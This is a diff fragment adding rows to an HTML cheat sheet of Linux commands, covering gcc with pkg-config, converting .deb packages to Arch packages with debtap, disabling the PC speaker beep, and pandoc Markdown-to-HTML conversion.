+      <tr><td><code>gcc file.c -o out $(pkg-config --cflags --libs gtk+-3.0)</code></td><td>compile against a library using pkg-config for the flags</td></tr>
+      <tr><td><code>git clone https://github.com/helktron/debtap.git<br>sudo pacman -S pkgfile pacman-contrib<br>sudo ./debtap -u<br>sudo ./debtap file.deb<br>sudo pacman -U *.pkg.tar.zst</code></td><td>convert a .deb package to an Arch package and install it</td></tr>
+      <tr><td><code>echo "blacklist pcspkr" | sudo tee /etc/modprobe.d/nobeep.conf<br>sudo rmmod pcspkr snd_pcsp</code></td><td>disable the PC speaker beep</td></tr>
+      <tr><td><code>pandoc input.md -o output.html --embed-resources --standalone</code></td><td>convert Markdown to a single self-contained HTML file, images embedded as base64</td></tr>
+      </tbody>
+    </table>
+  </article>
+  <div class="prompt"><a href="./">$ cd ..</a></div>
+  <footer>&copy; 2026 gloomydog</footer>
+</main>
+</body>
+</html>
